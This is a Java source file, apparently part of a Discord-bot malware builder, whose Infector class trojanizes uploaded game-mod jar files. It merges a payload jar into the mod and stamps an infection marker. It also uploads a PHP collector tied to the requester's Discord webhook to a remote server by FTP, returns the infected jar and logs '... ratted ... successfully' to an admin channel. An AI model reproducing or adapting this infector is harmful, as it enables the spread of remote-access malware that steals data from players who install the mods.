package xyz.maywr.jugg.infector;

import lombok.RequiredArgsConstructor;
import net.dv8tion.jda.api.entities.MessageChannel;
import net.dv8tion.jda.api.entities.User;
import org.objectweb.asm.*;
import xyz.maywr.jugg.ServerBootstrap;
import xyz.maywr.jugg.anonfiles.AnonAPI;
import xyz.maywr.jugg.storage.KeyStorage;
import xyz.maywr.jugg.storage.WebhookStorage;
import xyz.maywr.jugg.util.IOUtil;
import xyz.maywr.jugg.util.MessageUtil;
import xyz.maywr.jugg.util.StringUtil;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarFile;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

/**
 * @author maywr
 * 15.07.2022 1:04
 */
public @RequiredArgsConstructor
class Infector implements Opcodes
{
    private final File file;
    private final MessageChannel channel;
    private final User user;

    private static String getInfectedName()
    {
        return StringUtil.generateString( 15 ) + ".jar";
    }

    public void infectJar()
    {
        try
        {
            if ( !WebhookStorage.getInstance().hasWebhook(KeyStorage.getInstance().getKeyFor(user) ) )
            {
                MessageUtil.error( "enter a webhook by using $webhook <webhook> first", channel );
                return;
            }

            File f = new File( ServerBootstrap.OUTPUT_FOLDER, getInfectedName() );
            if ( !f.createNewFile() )
                throw new IOException( "failed to create file" );

            ZipOutputStream zos = new ZipOutputStream( Files.newOutputStream( f.toPath() ) );
            ZipInputStream zis = new ZipInputStream( Files.newInputStream( file.toPath() ) );

            ZipEntry zipEntry;
            while ( ( zipEntry = zis.getNextEntry() ) != null )
            {
                if ( zipEntry.getName().equals( "a/b/c/d.class" ) || zipEntry.getName().equals( "asset/og.data" ) )
                {
                    MessageUtil.error( "the following mod is already infected", channel );
                    return;
                }

                if ( zipEntry.getName().equals( JarFile.MANIFEST_NAME ) ) continue;
                zos.putNextEntry( new ZipEntry( zipEntry ) );
                zos.write( IOUtil.toByteArray( zis ) );
                zos.closeEntry();
            }

            ZipInputStream dataZis = new ZipInputStream( Files.newInputStream( new File( "data.jar" ).toPath() ) );
            ZipEntry dataEntry;
            while ( ( dataEntry = dataZis.getNextEntry() ) != null )
            {
                if ( dataEntry.getName().equals( JarFile.MANIFEST_NAME ) ) continue;

                zos.putNextEntry( new ZipEntry( dataEntry ) );
                zos.write( IOUtil.toByteArray( dataZis ) );
                zos.closeEntry();
            }

            dataZis.close();
            zis.close();

            zos.putNextEntry( new ZipEntry( "asset/og.data" ) );
            zos.write( StringUtil.sha256( file.getName() ).getBytes( StandardCharsets.UTF_8 ) );
            zos.closeEntry();

            zos.close();


            final String key = KeyStorage.getInstance().getKeyFor( user );
            File tempFile = new File( StringUtil.sha256( file.getName() ) + ".php" );
            tempFile.deleteOnExit();

            if ( !tempFile.createNewFile() )
            {
                throw new IOException( "cant create " + tempFile.getName() );
            }

            String content = new String( IOUtil.toByteArray( getClass().getClassLoader()
                    .getResourceAsStream( "upload.php" ) ) ).replace( "WEBHOOK_REPLACE", WebhookStorage
                    .getInstance().getWebhook( key ) );
            Files.write( tempFile.toPath(), content.getBytes( StandardCharsets.UTF_8 ) );

            FTP.getInstance().upload( tempFile, "/www/yoink.site/atlanta/" );

            if ( !tempFile.delete() )
            {
                System.err.println( "could not delete " + tempFile.getName() );
            }

            if ( f.length() <= 8 * ( 1 * Math.pow( 10, 6 ) ) )
            {
                channel.sendFile( f ).submit();
            } else
            {
                final String link = AnonAPI.upload( f );
                MessageUtil.success( "success", link, channel );
            }

            try
            {
                MessageUtil.success( String.format( "%s ratted %s successfully", user.getName(), file.getName() ),
                        "$$$", ServerBootstrap.getAdminChannel() );
            } catch ( Exception e )
            {
                e.printStackTrace();
            }


        } catch ( Exception e )
        {
            MessageUtil.error( "failed to infect jar", "the log file is sent to developers", channel );
            System.err.println(user.getName() + " " + file.getName());
            e.printStackTrace();
        }
    }

}
